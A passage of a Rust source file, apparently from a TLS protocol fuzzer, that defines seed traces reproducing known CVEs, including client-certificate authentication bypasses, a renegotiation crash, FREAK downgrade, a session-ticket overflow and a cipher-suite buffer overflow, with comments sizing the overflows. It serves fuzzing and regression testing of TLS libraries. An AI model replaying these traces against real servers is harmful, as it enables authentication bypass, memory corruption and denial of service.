#![allow(dead_code)]

use puffin::agent::{AgentDescriptor, AgentName};
use puffin::algebra::dynamic_function::TypeShape;
use puffin::put_registry::Factory;
use puffin::trace::{Action, InputAction, OutputAction, Step, Trace};
use puffin::{input_action, term};

use crate::protocol::{
    AgentType, MessageFlight, TLSDescriptorConfig, TLSProtocolBehavior, TLSProtocolTypes,
    TLSVersion,
};
use crate::query::TlsQueryMatcher;
use crate::tls::fn_impl::*;
use crate::tls::rustls::msgs::enums::HandshakeType;
use crate::tls::rustls::msgs::message::OpaqueMessage;
use crate::tls::seeds::*;

/// The `vulnerabilities` corpus: known CVE reproducers
pub fn create_corpus(
    put: &dyn Factory<TLSProtocolBehavior>,
) -> Vec<(Trace<TLSProtocolTypes>, &'static str)> {
    puffin::corpus!(
        // Descriptor sets `client_authentication: true` (client-cert authentication bypass).
        seed_cve_2022_25638: put.supports("tls13") && put.supports("client_authentication_transcript_extraction"),
        seed_cve_2022_25640: put.supports("tls13") && put.supports("client_authentication_transcript_extraction"),
        seed_cve_2022_25640_simple: put.supports("tls13") && put.supports("client_authentication_transcript_extraction"),

        // TLS 1.2 only, no resumption, no client authentication.
        seed_cve_2021_3449: put.supports("tls12"),
        seed_freak: put.supports("tls12"),

        // Relies on TLS 1.2 session tickets (`fn_new_session_ticket`).
        seed_cve_2022_38153: put.supports("tls12") && put.supports("tls12_session_resumption"),
        seed_cve_simple_2022_38153: put.supports("tls12") && put.supports("tls12_session_resumption"),

        // Relies on TLS 1.3 session tickets (`fn_new_session_ticket13`).
        seed_cve_2022_39173: put.supports("tls13") && put.supports("tls13_session_resumption"),
        // Seed too large
        seed_cve_2022_39173_full: put.supports("tls13") && put.supports("tls13_session_resumption"),
        seed_cve_2022_39173_minimized: put.supports("tls13") && put.supports("tls13_session_resumption"),

        // Downgrade attack: the client offers both TLS 1.2 and TLS 1.3 (`TLSVersion::Both`).
        seed_cve_2024_5814: put.supports("tls12") && put.supports("tls13"),

        // Malicious server: CKS extension, X9.146 dual-algorithm certificate (needs PUT support).
        seed_cve_2026_5393: put.supports("tls13") && put.supports("dual_alg_certs_support"),
    )
}

/// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25638>
pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                  (fn_append_cipher_suite(
                  (fn_new_cipher_suites()),
                   fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension_make(
                                (fn_support_group_extension_append(
                                    fn_support_group_extension_new,
                                    fn_named_group_secp384r1
                                ))
                            ))
                        )),
                        (fn_signature_algorithm_extension(
                            (fn_supported_signature_schemes_extension_append(
                                (fn_supported_signature_schemes_extension_append(
                                    fn_supported_signature_schemes_extension_new,
                                    fn_sig_scheme_rsa_pkcs1_sha256
                                )),
                                fn_sig_scheme_rsa_pss_sha256
                            ))
                        ))
                    )),
                    (fn_key_share_extension_make(
                        (fn_key_share_extension_append(
                            fn_key_share_extension_new,
                            (fn_key_share_deterministic(fn_named_group_secp384r1))
                        ))
                    ))
                )),
                fn_supported_versions13_extension
            ))
        )))
    };

    let decrypted_handshake = term! {
        fn_decrypt_handshake_flight(
            ((server, 0)/MessageFlight), // The first flight of messages sent by the server
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0,  // sequence 0
            fn_new_random,
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_find_server_certificate_request((@decrypted_handshake))
    };

    let certificate_rsa = term! {
        fn_certificate13(
            (fn_payload_u8((fn_get_context((@certificate_request_message))))),
            //fn_empty_certificate_chain
            // Or append eve cert
            (fn_certificate_entries_make(
                (fn_chain_append_certificate_entry(
                  fn_empty_certificate_chain,
                  (fn_certificate_entry_extensions(
                    fn_eve_cert,
                    (fn_cert_extensions_make(
                        fn_cert_extensions_new
                    ))
                ))
            ))))
        )
    };

    let certificate_verify_rsa = term! {
        fn_certificate_verify(
            fn_invalid_signature_algorithm,
            // Option 1 (something random, only possible because of fn_empty_certificate_chain, if FAIL_IF_NO_PEER_CERT is unset):
            //fn_eve_cert // or fn_empty_bytes_vec
            // Option 2 (impersonating eve, you have to send eve cert):
            (fn_payload_u16(fn_eve_pkcs1_signature))
            // Option 3 (for testing):
            /* (fn_rsa_sign_client(
                (fn_certificate_transcript(((server, 0)))),
                fn_eve_private_key, // some random private key
                fn_rsa_pkcs1_signature_algorithm
            ))*/
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1,
                fn_new_random,
                fn_cipher_suite13_aes_128_gcm_sha256
            ))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            TLSDescriptorConfig {
                tls_version: TLSVersion::V1_3,
                typ: AgentType::Server,
                client_authentication: true,
                ..TLSDescriptorConfig::default()
            },
        )],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@certificate_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0,  // sequence 0
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                         fn_encrypt_handshake(
                            (@certificate_verify_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1,  // sequence 1
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2,  // sequence 2
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

/// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640>
pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                  (fn_append_cipher_suite(
                  (fn_new_cipher_suites()),
                  fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension_make(
                                (fn_support_group_extension_append(
                                    fn_support_group_extension_new,
                                    fn_named_group_secp384r1
                                ))
                            ))
                        )),
                        (fn_signature_algorithm_extension(
                            (fn_supported_signature_schemes_extension_append(
                                (fn_supported_signature_schemes_extension_append(
                                    fn_supported_signature_schemes_extension_new,
                                    fn_sig_scheme_rsa_pkcs1_sha256
                                )),
                                fn_sig_scheme_rsa_pss_sha256
                            ))
                        ))
                    )),
                    (fn_key_share_extension_make(
                        (fn_key_share_extension_append(
                            fn_key_share_extension_new,
                            (fn_key_share_deterministic(fn_named_group_secp384r1))
                        ))
                    ))
                )),
                fn_supported_versions13_extension
            ))
        )))
    };

    let decrypted_handshake = term! {
        fn_decrypt_handshake_flight(
            ((server, 0)/MessageFlight), // The first flight of messages sent by the server
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0,  // sequence 0
            fn_new_random,
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_find_server_certificate_request((@decrypted_handshake))
    };

    let certificate = term! {
        fn_certificate13(
            (fn_payload_u8((fn_get_context((@certificate_request_message))))),
            (fn_certificate_entries_make(
                (fn_chain_append_certificate_entry(
                fn_empty_certificate_chain,
                (fn_certificate_entry_extensions(
                    fn_eve_cert,
                    (fn_cert_extensions_make(
                        fn_cert_extensions_new
                    ))
                ))
            ))))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_certificate_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1,
                fn_new_random,
                fn_cipher_suite13_aes_128_gcm_sha256
            ))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            TLSDescriptorConfig {
                tls_version: TLSVersion::V1_3,
                typ: AgentType::Server,
                client_authentication: true,
                ..TLSDescriptorConfig::default()
            },
        )],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@certificate),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0,  // sequence 0
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1,  // sequence 1
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

/// <https://nvd.nist.gov/vuln/detail/cve-2021-3449>
pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
    let (mut trace, client_verify_data) = _seed_client_attacker12(server);

    let renegotiation_client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                (fn_support_group_extension_make(
                                    (fn_support_group_extension_append(
                                        fn_support_group_extension_new,
                                        fn_named_group_secp384r1
                                    ))
                                ))
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension((fn_payload_u8((@client_verify_data)))))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )))
    };

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(input_action! { term! {
                fn_encrypt12(
                    (@renegotiation_client_hello),
                    ((server, 0)),
                    (fn_decode_server_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1,
                    fn_new_random,
                    fn_cipher_suite12
                )
            }
        }),
    });

    /*trace.steps.push(Step {
        agent: server,
        action: Action::Input(input_action! { term! {
                fn_encrypt12(
                    renegotiation_client_hello,
                    ((server, 0)),
                    (fn_decode_server_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1
                )
            }
        }),
    });*/

    trace
}

// Removed in favor of bit-level mutations replacing size-cheating custom function symbols such as
// `fn_heartbeat_fake_length`. We specifically tested we can refind such trace through bit-level
// mutations. We did it CVE 2022 38153, see `test_seed_bitmut_cve_2022_38153`.
// test_seed_bitmut_cve_2022_38153
// pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
//     let client_hello = term! {
//           fn_client_hello(
//             fn_protocol_version12,
//             fn_new_random,
//             fn_new_session_id,
//             (fn_cipher_suites_make(
//                 (fn_append_cipher_suite(
//                 (fn_new_cipher_suites()),
//                 // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
//                 fn_cipher_suite12
//             )))),
//             fn_compressions,
//             (fn_client_extensions_make(
//             (fn_client_extensions_append(
//                 (fn_client_extensions_append(
//                     (fn_client_extensions_append(
//                         fn_client_extensions_new,
//                         (fn_support_group_extension_make(
//                             (fn_support_group_extension_append(
//                                 fn_support_group_extension_new,
//                                 fn_named_group_secp384r1
//                             ))
//                         ))
//                     )),
//                     fn_ec_point_formats_extension
//                 )),
//                 fn_signed_certificate_timestamp_extension
//             ))
//         )))
//     };
//
//     Trace {
//         prior_traces: vec![],
//         descriptors: vec![
//             TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
//             TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
//         ],
//         steps: vec![
//             Step {
//                 agent: server,
//                 action: Action::Input(input_action! { client_hello
//                 }),
//             },
//             // Send directly after client_hello such that this does not need to be encrypted
//             Step {
//                 agent: server,
//                 action: Action::Input(input_action! { term! {
//                         fn_heartbeat_fake_length((fn_payload_u16(fn_empty_bytes_vec)),
// fn_large_length)                     }
//                 }),
//             },
//         ],
//     }
// }

pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        (fn_cipher_suites_make(
                            (fn_append_cipher_suite(
                            (fn_new_cipher_suites()),
                            fn_weak_export_cipher_suite
                        )))),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                    fn_server_hello(
                        ((server, 0)),
                        ((server, 0)),
                        ((server, 0)),
                        (fn_secure_rsa_cipher_suite12),
                        ((server, 0)),
                        ((server, 0))
                    )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    }
                }),
            },
            // Server Key Exchange, Server -> Client
            // If the KEX fails here, then no ephemeral KEX is used
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_key_exchange(  // check whether the client rejects this if it does not support export
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_hello_done
                    }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_client_key_exchange(
                             ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_change_cipher_spec
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

/// A simplified version of [`seed_cve_2022_25640`]
pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension_make(
                                (fn_support_group_extension_append(
                                    fn_support_group_extension_new,
                                    fn_named_group_secp384r1
                                ))
                            ))
                        )),
                        (fn_signature_algorithm_extension(
                            (fn_supported_signature_schemes_extension_append(
                                (fn_supported_signature_schemes_extension_append(
                                    fn_supported_signature_schemes_extension_new,
                                    fn_sig_scheme_rsa_pkcs1_sha256
                                )),
                                fn_sig_scheme_rsa_pss_sha256
                            ))
                        ))
                    )),
                    (fn_key_share_extension_make(
                        (fn_key_share_extension_append(
                            fn_key_share_extension_new,
                            (fn_key_share_deterministic(fn_named_group_secp384r1))
                        ))
                    ))
                )),
                fn_supported_versions13_extension
            ))
        )))
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1,
                fn_new_random,
                fn_cipher_suite13_aes_128_gcm_sha256
            ))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            TLSDescriptorConfig {
                tls_version: TLSVersion::V1_3,
                typ: AgentType::Server,
                client_authentication: true,
                ..TLSDescriptorConfig::default()
            },
        )],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0,  // sequence 0
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((server, 0)),
                            ((server, 0)),
                            ((client, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0))
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    }
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_key_exchange(
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_hello_done
                    }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_client_key_exchange(
                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_change_cipher_spec
                    }
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                           (client, 3)[None] > TypeShape::of::<OpaqueMessage>()
                    }
                }),
            },
            // NewSessionTicket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_new_session_ticket(
                            ((server, 0)/u32),
                            (fn_payload_u16(fn_large_bytes_vec))
                        )
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

// Same as seed_cve_2022_38153 without the final fn_large_bytes_vec, to check whether we refind it
// through bit-level mutations
pub fn seed_cve_simple_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    let new_session_ticket_payload = term! {
        fn_payload_u16(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::NewSessionTicket)))]/Vec<u8>))
    };

    let last_term = term! {
        fn_new_session_ticket(
            ((server, 0)/u32),
            (@new_session_ticket_payload)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![
            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((server, 0)),
                            ((server, 0)),
                            ((client, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0))
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    }
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_key_exchange(
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_hello_done
                    }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_client_key_exchange(
                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_change_cipher_spec
                    }
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                           (client, 3)[None] > TypeShape::of::<OpaqueMessage>()
                    }
                }),
            },
            // NewSessionTicket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { last_term }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_39173(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TLSProtocolTypes> {
    let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0, // sequence restarts at 0 because we are decrypting now traffic
            fn_new_random,
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };
    for _ in 0..149 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                (fn_append_cipher_suite(
                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
                fn_cipher_suite13_aes_256_gcm_sha384
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                (fn_signature_algorithm_extension(
                                    (fn_supported_signature_schemes_extension_append(
                                        (fn_supported_signature_schemes_extension_append(
                                            fn_supported_signature_schemes_extension_new,
                                            fn_sig_scheme_rsa_pkcs1_sha256
                                        )),
                                        fn_sig_scheme_rsa_pss_sha256
                                    ))
                                ))
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_extension_make(
                            (fn_key_share_extension_append(
                                fn_key_share_extension_new,
                                (fn_key_share_deterministic(fn_named_group_secp384r1))
                            ))
                        ))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )))
    };

    let psk = term! {
        fn_derive_psk(
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_client_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message))),
            fn_named_group_secp384r1,
            fn_new_random,
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk),
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    Trace {
        // Step 1: Prior trace performs an initial TLS 1.3 session with a full handshake and
        // establishes a PSK, including Client Hello number 1 (`CH1`).
        prior_traces: vec![initial_handshake],
        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            // Step 2: sends a Client Hello (CH2) with a missing support_group_extension that will
            // make the server enters the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE`
            // and with PSK resuming previous session. CH2 includes a list of repeated
            // ciphers that will be stored in ssl->suites->suites.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
            // Step 3: sends a Client Hello (CH3) with a missing support_group_extension that will
            // keep the server in the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and
            // with PSK resuming previous session. CH3 includes a list of repeated
            // ciphers that will be matched against ssl->suites->suites.
            // Since ssl->suites->suites already contain repeated ciphers, the function
            // refineSuites in tls13.c will wrongly consider all pairs leading to an
            // explosion of sizeSz and the buffer overflow. Note: CH3 could also
            // include support_group_extension.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_39173_full(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TLSProtocolTypes> {
    let (
        initial_handshake,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    ) = _seed_client_attacker_full(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket?
            (@server_hello_transcript),
            (@server_finished_transcript),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
